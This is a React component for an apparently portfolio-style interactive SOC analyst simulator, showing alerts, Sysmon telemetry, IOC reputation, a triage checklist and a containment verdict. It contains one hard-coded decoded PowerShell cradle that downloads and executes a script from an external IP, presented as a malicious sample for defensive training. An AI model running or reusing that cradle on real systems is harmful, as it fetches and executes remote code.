import React, { useState } from 'react';
import { 
  ShieldAlert, 
  Terminal, 
  Search, 
  CheckCircle2, 
  AlertTriangle, 
  Flame, 
  Lock, 
  Key, 
  RefreshCw, 
  Cpu, 
  Check, 
  Copy, 
  Play, 
  FileSearch, 
  Radio
} from 'lucide-react';
import { TRIAGE_SCENARIOS } from '../data/portfolioData';
import { TriageScenario } from '../types';

export const TriageSimulatorSection: React.FC = () => {
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>(TRIAGE_SCENARIOS[0].id);
  const [decodedPayload, setDecodedPayload] = useState<boolean>(false);
  const [completedSteps, setCompletedSteps] = useState<{ [key: string]: boolean }>({});
  const [verdictSubmitted, setVerdictSubmitted] = useState<boolean>(false);
  const [copiedLog, setCopiedLog] = useState<boolean>(false);

  const scenario: TriageScenario = TRIAGE_SCENARIOS.find(s => s.id === selectedScenarioId) || TRIAGE_SCENARIOS[0];

  const handleStepToggle = (stepIndex: number) => {
    const key = `${scenario.id}-${stepIndex}`;
    setCompletedSteps(prev => ({
      ...prev,
      [key]: !prev[key]
    }));
  };

  const handleCopyLog = () => {
    navigator.clipboard.writeText(scenario.sysmonLog);
    setCopiedLog(true);
    setTimeout(() => setCopiedLog(false), 2000);
  };

  const handleReset = (id: string) => {
    setSelectedScenarioId(id);
    setDecodedPayload(false);
    setVerdictSubmitted(false);
  };

  return (
    <section id="triage-simulator" className="py-20 bg-slate-950 relative border-t border-slate-800/80">
      {/* Background cyber grid */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#0f172a_1px,transparent_1px),linear-gradient(to_bottom,#0f172a_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] opacity-30 pointer-events-none" />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-4 mb-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-950/70 border border-cyan-500/30 text-xs font-semibold text-cyan-400 mb-3">
              <ShieldAlert className="w-3.5 h-3.5 animate-pulse" />
              <span>Interactive SOC Analyst Simulator</span>
            </div>
            <h2 className="text-2xl sm:text-4xl font-extrabold tracking-tight text-white">
              Live Alert Triage & Incident Investigation
            </h2>
            <p className="text-slate-400 text-sm sm:text-base mt-1 max-w-2xl">
              Experience the actual analytical workflow: inspect raw Sysmon telemetry, decode obfuscated malware payloads, review threat intelligence reputation, and execute standardized containment steps.
            </p>
          </div>

          {/* Scenario Selector Tabs */}
          <div className="flex items-center gap-2 bg-slate-900 p-1.5 rounded-xl border border-slate-800 self-start md:self-auto">
            {TRIAGE_SCENARIOS.map((s, idx) => (
              <button
                key={s.id}
                onClick={() => handleReset(s.id)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 ${
                  selectedScenarioId === s.id
                    ? 'bg-cyan-600 text-white shadow-md'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'
                }`}
              >
                <Radio className={`w-3 h-3 ${selectedScenarioId === s.id ? 'text-white' : 'text-slate-500'}`} />
                <span>Scenario {idx + 1}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Interactive Triage Console */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Left Column: Alert Metadata & Telemetry Inspector (7 Cols) */}
          <div className="lg:col-span-7 space-y-5">
            {/* Alert Header Card */}
            <div className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
                <div className="flex items-center gap-2">
                  <span className="px-2 py-0.5 rounded text-xs font-bold font-mono bg-red-950/80 text-red-400 border border-red-800/60 flex items-center gap-1">
                    <AlertTriangle className="w-3 h-3" />
                    {scenario.severity} SEVERITY
                  </span>
                  <span className="text-xs text-slate-400 font-mono">
                    {scenario.timestamp}
                  </span>
                </div>
                <span className="text-xs font-mono text-cyan-400 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                  {scenario.logSource}
                </span>
              </div>

              <div>
                <h3 className="text-base sm:text-lg font-bold text-white leading-snug">
                  {scenario.alertTitle}
                </h3>
                <p className="text-xs sm:text-sm text-slate-300 mt-1 leading-relaxed">
                  {scenario.description}
                </p>
              </div>

              {/* Host & User Meta */}
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 pt-2">
                <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800/80">
                  <span className="text-[10px] text-slate-400 block uppercase font-medium">Impacted Host</span>
                  <span className="text-xs font-mono font-bold text-cyan-300 truncate block">
                    {scenario.sourceHost}
                  </span>
                </div>
                <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800/80">
                  <span className="text-[10px] text-slate-400 block uppercase font-medium">User Account</span>
                  <span className="text-xs font-mono font-bold text-amber-300 truncate block">
                    {scenario.userAccount}
                  </span>
                </div>
                <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800/80 col-span-2 sm:col-span-1">
                  <span className="text-[10px] text-slate-400 block uppercase font-medium">MITRE Chain</span>
                  <span className="text-[11px] font-mono text-slate-300 truncate block" title={scenario.mitreMapping}>
                    T1059.001 / T1105
                  </span>
                </div>
              </div>
            </div>

            {/* Raw Telemetry Log Viewer */}
            <div className="rounded-2xl bg-slate-950 border border-slate-800 overflow-hidden">
              <div className="flex items-center justify-between px-4 py-2.5 bg-slate-900 border-b border-slate-800">
                <div className="flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  <span className="text-xs font-mono font-semibold text-slate-300">
                    Raw Telemetry Event Stream
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    onClick={handleCopyLog}
                    className="inline-flex items-center gap-1 px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[11px] font-mono transition-colors"
                  >
                    {copiedLog ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedLog ? 'Copied' : 'Copy Log'}</span>
                  </button>
                </div>
              </div>

              <div className="p-4 text-xs font-mono text-cyan-300/90 overflow-x-auto max-h-64 leading-relaxed bg-slate-950 select-all">
                <pre className="whitespace-pre">{scenario.sysmonLog}</pre>
              </div>

              {/* Interactive Tool: Decode Base64 Payload */}
              <div className="p-3 bg-slate-900/90 border-t border-slate-800 flex flex-wrap items-center justify-between gap-3">
                <div className="flex items-center gap-2 text-xs text-slate-300">
                  <Key className="w-4 h-4 text-amber-400" />
                  <span>Obfuscated Base64 String Detected in CommandLine</span>
                </div>
                <button
                  onClick={() => setDecodedPayload(!decodedPayload)}
                  className={`px-3 py-1.5 rounded-lg text-xs font-semibold font-mono flex items-center gap-1.5 transition-all ${
                    decodedPayload
                      ? 'bg-amber-600 text-white shadow-md'
                      : 'bg-slate-800 hover:bg-slate-700 text-amber-300 border border-amber-500/30'
                  }`}
                >
                  <RefreshCw className={`w-3 h-3 ${decodedPayload ? 'rotate-180' : ''}`} />
                  <span>{decodedPayload ? 'Hide Decoded Payload' : 'Decode Base64 Command'}</span>
                </button>
              </div>

              {decodedPayload && (
                <div className="p-4 bg-amber-950/30 border-t border-amber-900/50 text-xs font-mono text-amber-200">
                  <span className="font-bold block text-amber-400 mb-1">
                    [CyberChef / Python Base64 Decoder Result]:
                  </span>
                  <code className="p-2 rounded bg-black/50 block text-emerald-300">
                    IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5:8080/b.ps1')
                  </code>
                  <p className="text-[11px] text-slate-400 mt-2">
                    Observation: In-memory download & execution cradle targeting external C2 staging server on TCP 8080.
                  </p>
                </div>
              )}
            </div>

            {/* IOC Reputation Checks */}
            <div className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
                <FileSearch className="w-4 h-4 text-cyan-400" /> Extracted Artifacts & Threat Intelligence Feeds
              </h4>
              <div className="space-y-2.5">
                {scenario.iocs.map((ioc, idx) => (
                  <div
                    key={idx}
                    className="p-3 rounded-xl bg-slate-950 border border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-2"
                  >
                    <div className="space-y-0.5">
                      <span className="text-xs font-mono text-slate-200 block break-all font-semibold">
                        {ioc.artifact}
                      </span>
                      <p className="text-[11px] text-slate-400">
                        {ioc.details}
                      </p>
                    </div>
                    <span
                      className={`px-2.5 py-1 rounded text-[11px] font-bold font-mono self-start sm:self-auto shrink-0 ${
                        ioc.reputation === 'Malicious'
                          ? 'bg-red-950/80 text-red-400 border border-red-800'
                          : 'bg-amber-950/80 text-amber-400 border border-amber-800'
                      }`}
                    >
                      {ioc.reputation}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Right Column: Analyst Triage Checklist & Containment Verdict (5 Cols) */}
          <div className="lg:col-span-5 space-y-5">
            {/* Step-by-Step Triage Checklist */}
            <div className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <h4 className="text-sm font-bold text-white flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-cyan-400" />
                  <span>Analyst Triage Playbook</span>
                </h4>
                <span className="text-xs text-slate-400">
                  Step completion tracker
                </span>
              </div>

              <div className="space-y-3">
                {scenario.triageSteps.map((stepItem, idx) => {
                  const stepKey = `${scenario.id}-${idx}`;
                  const isChecked = completedSteps[stepKey] ?? stepItem.completed;
                  return (
                    <div
                      key={idx}
                      onClick={() => handleStepToggle(idx)}
                      className={`p-3.5 rounded-xl border transition-all cursor-pointer select-none ${
                        isChecked
                          ? 'bg-cyan-950/30 border-cyan-500/40 text-slate-200'
                          : 'bg-slate-950/70 border-slate-800 text-slate-400 hover:border-slate-700'
                      }`}
                    >
                      <div className="flex items-start gap-2.5">
                        <div
                          className={`w-5 h-5 rounded-md flex items-center justify-center mt-0.5 shrink-0 transition-colors ${
                            isChecked
                              ? 'bg-cyan-600 text-white'
                              : 'border border-slate-600 bg-slate-900'
                          }`}
                        >
                          {isChecked && <Check className="w-3.5 h-3.5" />}
                        </div>
                        <div className="space-y-1">
                          <span className="text-xs font-bold text-white block">
                            {stepItem.step}
                          </span>
                          <p className="text-xs text-slate-300 leading-relaxed">
                            {stepItem.recommendedAction}
                          </p>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Verdict & Containment Submission */}
            <div className="p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <h4 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1.5">
                <ShieldAlert className="w-4 h-4 text-emerald-400" /> Incident Determination & Action
              </h4>

              {!verdictSubmitted ? (
                <div className="space-y-3">
                  <p className="text-xs text-slate-300 leading-relaxed">
                    Based on the decoded PowerShell execution cradle, parent Word process anomaly, and external IP connection, finalize your incident disposition:
                  </p>
                  <button
                    onClick={() => setVerdictSubmitted(true)}
                    className="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 text-white font-bold text-xs sm:text-sm shadow-lg shadow-red-950/50 flex items-center justify-center gap-2 transition-all active:scale-98"
                  >
                    <ShieldAlert className="w-4 h-4" />
                    <span>Confirm True Positive & Execute Containment</span>
                  </button>
                </div>
              ) : (
                <div className="p-4 rounded-xl bg-emerald-950/30 border border-emerald-500/40 space-y-3 animate-fadeIn">
                  <div className="flex items-center gap-2 text-emerald-400 font-bold text-xs sm:text-sm">
                    <CheckCircle2 className="w-4 h-4" />
                    <span>Verdict: {scenario.verdict}</span>
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    {scenario.remediationSummary}
                  </p>
                  <div className="pt-2 border-t border-emerald-900/40 flex items-center justify-between text-[11px] text-slate-400 font-mono">
                    <span>STATUS: INCIDENT RESOLVED</span>
                    <button
                      onClick={() => setVerdictSubmitted(false)}
                      className="text-cyan-400 hover:underline"
                    >
                      Reset Disposition
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
